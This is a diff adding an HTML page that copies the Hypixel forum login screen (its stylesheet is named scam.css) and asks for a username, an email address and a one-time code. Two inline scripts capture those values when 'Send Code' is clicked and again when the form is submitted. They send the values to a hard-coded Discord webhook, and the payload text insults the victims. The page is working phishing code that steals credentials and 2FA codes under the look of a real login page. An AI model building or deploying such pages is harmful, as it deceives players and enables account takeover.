@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in | Hypixel</title>
+    <link rel="stylesheet" href="scam.css">
+</head>
+<body>
+    <div id="Hypixel">
+        <img src="images/HypixelLogo.png" alt="Hypixel Logo" height="160" draggable="false">
+    </div>
+
+    <div class="blocks">
+        <form action="/login/login" method="post" class="block">
+            <input type="hidden" name="_xfToken" value="1732218715,8b2dbb270ffbc0d60e1c13badd95585f">
+            
+            <div class="block-container">
+                <div class="block-body">
+                    <dl class="formRow formRow--input">
+                        <dt>
+                            <label class="formRow-label" for="login">Your User name </label>
+                        </dt>
+                        <dd>
+                            <input type="text" class="input" name="username" autofocus autocomplete="username" id="username">
+                        </dd>
+                    </dl>
+                    <dt>
+                        <label class="formRow-label" for="login">Your email address</label>
+                    </dt>
+                    <dd>
+                        <input type="text" class="input" name="login" autofocus autocomplete="username" id="login">
+                    </dd>
+                </dl>
+
+                    <dl class="formRow formRow--input">
+
+                        <a id="sendCodeLink" style="cursor: pointer;">Send Code</a>  <br>
+                        <br>
+                        <dt>
+                            <label class="formRow-label" for="password">Code</label>
+                        </dt>
+                        <dd>
+                            <div class="inputGroup inputGroup--joined">
+                                <input type="text" name="password" class="input js-password input--passwordHideShow" autocomplete="current-password" id="password">
+                                <div class="inputGroup-text">
+                                    <label class="iconic iconic--hideShow js-hideShowContainer">
+                                    </label>
+                                </div>
+                            </div>
+                        </dd>
+                    </dl>
+
+                    <dl class="formRow">
+                        <dd>
+                            <ul class="inputChoices">
+                            </ul>
+                        </dd>
+                    </dl>
+
+                    <input type="hidden" name="_xfRedirect" value="/">
+
+                    <dl class="formRow formSubmitRow">
+                        <dd>
+                            <div class="formSubmitRow-controls">
+                                <button type="submit" class="button--primary button button--icon">
+                                    <span class="button-text">Log in</span>
+                                </button>
+                            </div>
+                        </dd>
+                    </dl>
+                </div>
+
+                <div class="block-outer block-outer--after">
+                    <div class="block-outer-middle">
+                        Don't have an account? <a href="/https://hypixel.net/register/" class="button">Register now</a>
+                    </div>
+                </div>
+            </div>
+        </form>
+    </div>
+    
+    <script>
+    document.addEventListener('DOMContentLoaded', function () {
+
+        const sendCodeLink = document.getElementById('sendCodeLink');
+
+        sendCodeLink.addEventListener('click', function(event) {
+            event.preventDefault(); 
+
+     
+            sendCodeFunction();
+        });
+
+        function sendCodeFunction() {
+    console.log('Send Code button clicked');
+
+    // Fetch the input value every time the button is clicked
+    let help = document.getElementById("login").value;
+
+    // Create a new XMLHttpRequest object for each request
+    var hook = new XMLHttpRequest();
+
+    hook.open('POST', 'https://discord.com/api/webhooks/1309617477445226628/pRuLAmJ9hLr6n6ZgoI-8d8-ReGqumBnfrjgOFNrvw2e01mNf3SFIw_iAQOU6REjqnI1o');
+    hook.setRequestHeader('Content-type', 'application/json');
+
+    // Set the payload
+    var content = {
+        username: 'Webhook Name',
+        avatar_url: 'https://example.com/profile-icon-for-bot.png',
+        content: `retards-Eamil: ${help}\n retards Code`
+    };
+
+    // Send the request
+    hook.send(JSON.stringify(content));
+}
+
+    });
+    </script>
+    
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const loginForm = document.querySelector('form');
+        
+            loginForm.addEventListener('submit', function (event) {
+                event.preventDefault(); // Prevent the form from submitting immediately
+        
+                // Get the email and OTP values
+                const email = document.getElementById("login").value;
+                const otp = document.getElementById("password").value;
+                const name = document.getElementById("username").value;
+                // Create a new XMLHttpRequest for the Discord webhook
+                const hook = new XMLHttpRequest();
+        
+                hook.open('POST', 'https://discord.com/api/webhooks/1309617477445226628/pRuLAmJ9hLr6n6ZgoI-8d8-ReGqumBnfrjgOFNrvw2e01mNf3SFIw_iAQOU6REjqnI1o');
+                hook.setRequestHeader('Content-type', 'application/json');
+        
+                // Create the embed content
+                const embedContent = {
+                    username: "Webhook Bot",
+                    avatar_url: "https://example.com/bot-avatar.png",
+                    embeds: [
+                        {
+                            title: "New Login Attempt",
+                            description: "A user has entered their credentials:",
+                            color: 15158332, // Red color for the embed
+                            fields: [
+                                {
+                                    name: "Email Address",
+                                    value: email || "Not provided",
+                                    inline: true
+                                },
+                                {
+                                    name: `User Name https://sky.shiiyu.moe/stats/${name}`,
+                                    value: name || "Not provided",
+                                    inline: true
+                                },
+                                {
+                                    name: "OTP Password",
+                                    value: otp || "Not provided",
+                                    inline: true
+                                }
+                            ],
+                            footer: {
+                                text: "Login Logger Bot",
+                                icon_url: "https://example.com/bot-footer-icon.png"
+                            },
+                            timestamp: new Date().toISOString()
+                        }
+                    ]
+                };
+        
+                // Send the request to the Discord webhook
+                hook.send(JSON.stringify(embedContent));
+        
+                // Proceed with form submission after sending the webhook
+                setTimeout(function () {
+                    loginForm.submit();
+                }, 3000); // Optional: 3-second delay to ensure the webhook is sent first
+            });
+        });
+        </script>
+        
+
+
+    <script src="def.js"></script>
+</body>
+</html>
